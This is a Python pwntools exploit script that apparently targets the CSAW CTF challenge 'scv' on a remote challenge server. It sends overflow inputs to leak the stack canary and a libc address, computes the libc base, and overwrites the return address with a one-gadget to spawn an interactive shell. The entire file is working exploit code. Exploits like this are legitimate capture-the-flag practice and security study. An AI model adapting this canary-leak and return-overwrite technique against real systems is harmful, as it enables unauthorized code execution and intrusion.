from pwn import *
from struct import pack,unpack

# context.log_level = 'DEBUG'



def main():
    r = remote('pwn.chal.csaw.io', 3764)
    # r = process("./scv")
    r.recvuntil(">>")
    
    
    
    # Get stack cookie
    r.send("1\n")
    r.recvuntil(">>")
    r.send("A"*0xA8 + "\n")
    r.recvuntil(">>")
    r.send("2\n")
    leak = r.recvuntil(">>")
    cookie = "\0" + leak[0x133:0x133+7]
    print "Stack cookie:", cookie.encode('hex')
    
    if cookie[-1] == "-":
        print "[!] Bad luck try again"
        return
    
    
    
    # Now get libc_start
    r.send("1\n")
    r.recvuntil(">>")
    r.send("A"*0xB8)
    r.recvuntil(">>")
    r.send("2\n")
    leak = r.recvuntil(">>")
    libc_start = unpack("<Q", leak[0x142:][:6] + "\0\0")[0]
    print "libc_start+?: 0x%x" % libc_start
    
    
    e = ELF('libc-2.23.so')
    base = libc_start - e.symbols['__libc_start_main']
    base &= 0xFFFFFFFFFFFFFF00
    print "libc base: %x" % base
    libc_bespoke = base + 0xf1117
    
    
    # Cleanup time
    r.send("1\n")
    r.recvuntil(">>")
    r.send("A"*0xA8 + cookie + "A"*8 + pack("<Q", libc_bespoke))
    r.recvuntil(">>")
    
    r.send("3\n")
    r.interactive()

if __name__ == "__main__":
    main()
